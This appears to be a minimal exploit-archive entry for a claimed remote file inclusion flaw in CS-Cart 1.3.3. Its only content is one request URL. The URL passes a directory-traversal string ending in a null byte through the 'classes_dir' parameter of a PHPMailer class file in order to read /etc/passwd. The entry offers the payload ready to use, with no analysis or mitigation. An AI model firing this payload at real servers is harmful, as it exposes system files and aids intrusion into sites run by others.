# CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion

```
http://192.168.219.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```
